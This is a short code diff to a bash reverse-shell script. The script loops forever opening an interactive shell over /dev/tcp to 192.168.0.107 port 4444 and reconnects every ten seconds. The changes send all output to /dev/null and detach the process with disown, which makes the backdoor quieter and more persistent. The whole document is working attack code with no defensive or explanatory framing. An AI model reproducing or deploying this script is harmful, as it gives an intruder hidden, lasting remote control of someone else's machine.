@@ -4,14 +4,17 @@
 ip_addr="192.168.0.107"
 port="4444"
 
+# Redirect all output and error messages to /dev/null
+exec 1>/dev/null 2>&1
+
 # Function to start the reverse shell
 start_reverse_shell() {
     while true; do
-        # Start the reverse shell, suppressing all output and error messages
-        bash -i >& /dev/tcp/$ip_addr/$port 0>&1 2>/dev/null
+        # Start the reverse shell
+        bash -i >& /dev/tcp/$ip_addr/$port 0>&1
         sleep 10 # Wait before reconnecting
     done
 }
 
-# Start the reverse shell function in the background and redirect all output to /dev/null
-start_reverse_shell &>/dev/null &
+# Start the reverse shell function in the background
+start_reverse_shell & disown
